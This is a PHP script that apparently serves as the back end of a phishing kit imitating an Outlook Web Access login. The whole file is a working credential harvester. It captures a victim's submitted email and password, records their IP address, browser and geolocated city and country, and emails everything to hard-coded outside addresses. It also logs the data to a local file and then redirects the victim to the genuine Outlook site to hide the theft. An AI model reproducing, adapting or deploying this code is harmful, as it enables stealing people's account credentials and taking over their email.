<?php
$Email = $_POST['Email'];
$password = $_POST['password'];
$ip = $_POST['ip'];
include 'antibots.php';

$TheBoss = "newerarezult007@gmail.com, newerarezult008@yandex.com";
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");
$logId = uniqid();
$geoplugin->locate();
$subject = "Owa Logs";
$headers = "From:  Result Server <Owa>";

$message .= "---------------|54|---------------\n";
$message .= "Email: $Email\n";
$message .= "Password: $password\n";
$message .= "IP Address : $ip\n";
$message .= "User-Agent: " . $browser . "\n";
$message .= "--------------------------------------------\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "-------------- modified by -----------------\n";

mail($TheBoss, $subject, $message, $headers);

echo "<html><head><script>window.top.location.href='https://outlook.live.com/owa/';</script></head><body></body></html>";

$fp = fopen("finish2.txt", "a");
fputs($fp, $message);
fclose($fp);
$praga = rand();
$praga = md5($praga);

?>
